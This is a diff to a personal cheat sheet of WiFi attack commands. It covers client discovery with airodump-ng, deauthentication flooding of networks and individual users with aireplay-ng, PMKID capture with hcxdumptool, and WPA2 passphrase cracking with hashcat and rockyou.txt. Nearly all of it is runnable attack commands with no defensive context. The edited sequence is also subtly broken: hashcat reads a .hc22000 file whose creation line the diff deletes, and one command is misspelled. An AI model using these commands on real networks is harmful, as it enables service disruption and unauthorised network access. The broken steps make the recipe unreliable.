@@ -33,14 +33,13 @@ AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -45   1e-1     0       800     -
 Station MAC is the client MAC 
 
 Get all clients :
-`airodump-ng --bssid <router MAC> -c <channel> wlan0mon`
+`airodump-ng --bssid <router MAC> -c <channel> wlo1mon`
 
 Deauth bombing: 
-`aireplay-ng --deauth 100 -a <router MAC> wlan0mon`
+`aireplay-ng --deauth 100 -a <router MAC> wlo1mon`
 
 Deauth particular user : 
-`aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon`
-
+`aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlo1mon`
 
 
 #  scan the wifi : 
@@ -49,6 +48,9 @@ sudo iwlist scan
 # top networks
 sudo airdump-ng start wlo1mon , or , 
 sudo airodump-ng wlo1mon --write scan --output-format csv
+
+# set the channel to capture
+sudo iw dev wlo1mon set channel 1
 
 # get all wifi present and bssid
 sudo iw dev wlo1 scan 
@@ -71,22 +73,17 @@ sudo airodump-ng --bssid 6c:4f:89:9a:3f:af -c 44 -w capture wlo1mon
 sudo aireplay-ng --deauth 20 -a 6c:4f:89:9a:3f:af wlo1mon --ignore-negative-one
 
 
-# HASHCAT 
-Pairwise Master Key Identifier (PMKID) 
+# HASHCAT for WPA-2
 
-##-- PMKID --##
+## PMKID ( Pairwise Master Key Identifier (PMKID) )
 
-#hcxdump-tool
+# hcxdump-tool
 sudo hcxdumptool -i wlo1mon -w pmkid.pcapng --rds=1
 
-#tool to unpack
+# Tool to unpack
 hcxpcapngtool -o pmkid.hccapx pmkid.pcapng
 
-#
-hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
-
-
-#
+# Decode 
 hashcat -m 22000 pmkid.hc22000 rockyou.txt --force
 
 
